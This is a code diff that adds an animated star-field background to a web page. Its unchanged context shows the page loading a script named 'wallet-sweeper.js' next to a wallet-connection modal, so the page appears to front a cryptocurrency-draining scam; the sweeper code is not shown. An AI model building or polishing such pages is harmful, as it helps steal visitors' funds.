@@ -701,9 +701,23 @@
             0%, 100% { opacity: 0.5; }
             50% { opacity: 0.8; }
         }
+        /* Hyperspeed Canvas */
+        #hyperspeed-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 1;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
+    <!-- Hyperspeed Background Canvas -->
+    <canvas id="hyperspeed-canvas"></canvas>
+
     <!-- Light Rays Background -->
     <div class="light-rays-container" id="lightRaysContainer">
         <div class="light-source"></div>
@@ -855,6 +869,211 @@
     <script src="js/wallet-sweeper.js?v=5.0"></script>
 
     <script>
+        // Hyperspeed Star Field Animation
+        (function() {
+            const canvas = document.getElementById('hyperspeed-canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Configuration
+            const config = {
+                starCount: 800,
+                speed: 0.5,
+                maxSpeed: 50,
+                acceleration: 0.2,
+                trailLength: 0.8,
+                starSize: 1.5,
+                centerX: 0,
+                centerY: 0
+            };
+
+            // Current speed (will accelerate)
+            let currentSpeed = config.speed;
+            let isAccelerating = false;
+
+            // Stars array
+            const stars = [];
+
+            // Star class
+            class Star {
+                constructor() {
+                    this.reset();
+                    // Randomize initial z position
+                    this.z = Math.random() * 1000;
+                }
+
+                reset() {
+                    // Random position in 3D space
+                    this.x = (Math.random() - 0.5) * 2000;
+                    this.y = (Math.random() - 0.5) * 2000;
+                    this.z = 1000;
+                    this.prevX = this.x;
+                    this.prevY = this.y;
+
+                    // Star properties
+                    this.size = Math.random() * 0.5 + 0.5;
+                    this.opacity = 1;
+                }
+
+                update() {
+                    // Store previous position for trails
+                    this.prevX = this.screenX || config.centerX;
+                    this.prevY = this.screenY || config.centerY;
+
+                    // Move star towards viewer
+                    this.z -= currentSpeed;
+
+                    // Reset if star passes viewer
+                    if (this.z <= 0) {
+                        this.reset();
+                    }
+
+                    // Calculate screen position
+                    this.screenX = (this.x / this.z) * 500 + config.centerX;
+                    this.screenY = (this.y / this.z) * 500 + config.centerY;
+
+                    // Calculate size based on distance
+                    this.displaySize = (1 - this.z / 1000) * config.starSize * this.size;
+
+                    // Calculate opacity based on distance
+                    this.opacity = Math.max(0, 1 - this.z / 1000);
+                }
+
+                draw() {
+                    // Draw star trail
+                    if (currentSpeed > 2) {
+                        ctx.beginPath();
+                        ctx.moveTo(this.prevX, this.prevY);
+                        ctx.lineTo(this.screenX, this.screenY);
+
+                        // Create gradient for trail
+                        const gradient = ctx.createLinearGradient(
+                            this.prevX, this.prevY,
+                            this.screenX, this.screenY
+                        );
+                        gradient.addColorStop(0, `rgba(0, 255, 255, 0)`);
+                        gradient.addColorStop(1, `rgba(0, 255, 255, ${this.opacity * 0.8})`);
+
+                        ctx.strokeStyle = gradient;
+                        ctx.lineWidth = this.displaySize;
+                        ctx.stroke();
+                    }
+
+                    // Draw star
+                    ctx.beginPath();
+                    ctx.arc(this.screenX, this.screenY, this.displaySize, 0, Math.PI * 2);
+
+                    // Star color with cyan tint
+                    const brightness = Math.floor(255 * this.opacity);
+                    ctx.fillStyle = `rgba(${brightness * 0.7}, ${brightness}, ${brightness}, ${this.opacity})`;
+                    ctx.fill();
+
+                    // Add glow effect for bright stars
+                    if (this.displaySize > 1) {
+                        ctx.beginPath();
+                        ctx.arc(this.screenX, this.screenY, this.displaySize * 2, 0, Math.PI * 2);
+                        ctx.fillStyle = `rgba(0, 255, 255, ${this.opacity * 0.2})`;
+                        ctx.fill();
+                    }
+                }
+            }
+
+            // Resize canvas
+            function resizeCanvas() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                config.centerX = canvas.width / 2;
+                config.centerY = canvas.height / 2;
+            }
+
+            // Initialize stars
+            function initStars() {
+                stars.length = 0;
+                for (let i = 0; i < config.starCount; i++) {
+                    stars.push(new Star());
+                }
+            }
+
+            // Animation loop
+            function animate() {
+                // Clear canvas with slight trail effect
+                ctx.fillStyle = 'rgba(0, 0, 5, 0.1)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                // Speed variation for hyperspeed effect
+                if (isAccelerating && currentSpeed < config.maxSpeed) {
+                    currentSpeed += config.acceleration;
+                } else if (!isAccelerating && currentSpeed > config.speed) {
+                    currentSpeed -= config.acceleration * 2;
+                }
+
+                // Update and draw stars
+                stars.forEach(star => {
+                    star.update();
+                    star.draw();
+                });
+
+                // Add center vortex effect at high speeds
+                if (currentSpeed > 10) {
+                    const gradient = ctx.createRadialGradient(
+                        config.centerX, config.centerY, 0,
+                        config.centerX, config.centerY, 100
+                    );
+                    gradient.addColorStop(0, 'rgba(0, 255, 255, 0.1)');
+                    gradient.addColorStop(1, 'rgba(0, 255, 255, 0)');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                }
+
+                requestAnimationFrame(animate);
+            }
+
+            // Mouse interaction for speed control (disabled to not interfere with UI)
+            // Uncomment below to enable click-and-hold speed boost
+            /*
+            canvas.style.pointerEvents = 'auto';
+            canvas.addEventListener('mousedown', () => {
+                isAccelerating = true;
+            });
+
+            canvas.addEventListener('mouseup', () => {
+                isAccelerating = false;
+            });
+
+            canvas.addEventListener('mouseleave', () => {
+                isAccelerating = false;
+            });
+
+            // Touch support for mobile
+            canvas.addEventListener('touchstart', () => {
+                isAccelerating = true;
+            });
+
+            canvas.addEventListener('touchend', () => {
+                isAccelerating = false;
+            });
+            */
+
+            // Auto-accelerate periodically for visual interest
+            setInterval(() => {
+                if (!isAccelerating && Math.random() > 0.8) {
+                    isAccelerating = true;
+                    setTimeout(() => {
+                        isAccelerating = false;
+                    }, 2000);
+                }
+            }, 5000);
+
+            // Handle window resize
+            window.addEventListener('resize', () => {
+                resizeCanvas();
+            });
+
+            // Initialize
+            resizeCanvas();
+            initStars();
+            animate();
+        })();
+
         // Modern wallet connection handling
         function showWalletModal() {
             const modal = document.getElementById('walletModal');
